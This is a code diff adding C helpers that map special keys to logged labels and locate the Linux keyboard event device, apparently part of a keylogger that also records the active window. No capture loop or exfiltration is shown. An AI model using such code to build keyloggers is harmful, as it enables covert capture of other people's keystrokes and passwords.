@@ -134,3 +134,48 @@ int get_active_window(Display *display, char **window) {
 
     return 0;
 }
+
+const char* get_key_name(xkb_keysym_t keysym){
+    switch (keysym) {
+        case XKB_KEY_Return: return "\n";
+        case XKB_KEY_Escape: return "[ESC]";
+        case XKB_KEY_Tab: return "\t";
+        case XKB_KEY_BackSpace: return "[BackSpace]";
+        default: return NULL;
+    }
+}
+
+int findKeyboardDeviceFileName(char *keyboardPath) {
+    FILE *file = fopen(PROC_INPUT_DEVICES, "r");
+    if (!file) {
+        fprintf(stderr, "Error opening %s\n", PROC_INPUT_DEVICES);
+        return 1;
+    }
+
+    char line[256];
+    char filename_event[64] = "";
+    char *ev = NULL;
+
+    while (fgets(line, sizeof(line), file)) {
+        if (line[0] == '\n') {
+            if (ev && filename_event[0]) {
+                sprintf(keyboardPath, "%s%s", EVENT_PATH, filename_event);
+                fclose(file);
+                return 0;
+            }
+            ev = NULL;
+            filename_event[0] = '\0';
+        } else if (strstr(line, "Handlers=")) {
+            char *ptr = strstr(line, "event");
+            int event_number;
+            if (ptr) {
+               sscanf(ptr, "event%d", &event_number);
+               snprintf(filename_event, sizeof(filename_event), "event%d", event_number);
+            }
+        } else if (strstr(line, "EV=120013")) {
+            ev = line;
+        }
+    }
+    fclose(file);
+    return 1;
+}
